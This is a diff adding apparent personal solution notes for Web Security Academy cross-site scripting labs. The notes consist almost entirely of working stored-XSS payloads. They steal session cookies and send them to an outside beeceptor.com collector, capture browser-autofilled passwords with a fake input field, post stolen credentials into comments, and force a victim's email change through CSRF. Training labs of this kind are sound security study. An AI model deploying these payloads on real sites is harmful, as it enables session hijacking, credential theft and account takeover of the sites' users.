@@ -215,3 +215,78 @@ JKSDFHSUD_SEARCH { } $ & - / \ ' " - +
 ```
 ${alert(1)}
 ```
+
+## Exploiting cross-site scripting to steal cookies
+
+Comment body is vuln to XSS.
+
+First solution using https://beeceptor.com/ (blocked by Burp WAF probably)
+```
+<script>
+    fetch('https://aaaaaa.free.beeceptor.com?q=' + document.cookie, {mode: 'no-cors'})
+</script>
+```
+
+Alternative solution. Create comment with body:
+```
+<script>
+window.addEventListener("load", ()=>{
+    var csrf = document.querySelector("form input[name='csrf']").value;
+    fetch("https://0a0500a9039dbb1a8057b2d0001d00ed.web-security-academy.net/post/comment", {
+    method: "POST",
+    headers: {
+        "Content-Type": "application/x-www-form-urlencoded"
+    },
+    body: 'csrf='+csrf+'&postId=1&comment='+encodeURIComponent(btoa(document.cookie))+'&name=Admin&email=email@email.com&website=http://example.com'
+    })
+}) 
+</script>
+```
+
+Then read the token of impersonated user from `postId = 1`
+
+## Exploiting cross-site scripting to capture passwords
+
+The goal here is to steal password that will be autofilled by browser / password managers in this website.
+
+First solution using https://beeceptor.com/ (blocked by Burp WAF probably)
+
+```
+<input name=username id=username>
+<input type=password name=password onchange="if(this.value.length)fetch('https://bbbbbb.free.beeceptor.com?q=' + username.value+':'+this.value,{
+method:'GET',
+mode: 'no-cors',
+});">
+```
+
+Alternative solution. Create comment with body:
+
+```
+<input name=username id=username>
+<input type=password name=password onchange="if(this.value.length)fetch('https://0afa00a0040eb1438c49639400ff00d8.web-security-academy.net/post/comment', {
+method: 'POST',
+headers: {
+    'Content-Type': 'application/x-www-form-urlencoded'
+},
+body: 'csrf='+document.querySelector('form input[name=\'csrf\']').value+'&postId=1&comment='+encodeURIComponent(btoa(username.value+'~'+this.value))+'&name=Admin&email=email@email.com&website=http://example.com'
+});">
+```
+
+Then read the username and password of impersonated user from `postId = 1`
+
+## Exploiting XSS to perform CSRF
+
+```
+<script>
+window.addEventListener("load", ()=>{
+    var csrf = document.querySelector("form input[name='csrf']").value;
+    fetch("https://0a5b0051036b221b80115357002200c1.web-security-academy.net/my-account/change-email", {
+    method: "POST",
+    headers: {
+        "Content-Type": "application/x-www-form-urlencoded"
+    },
+    body: 'csrf='+csrf+'&email=email@email.com'
+    })
+}) 
+</script>
+```
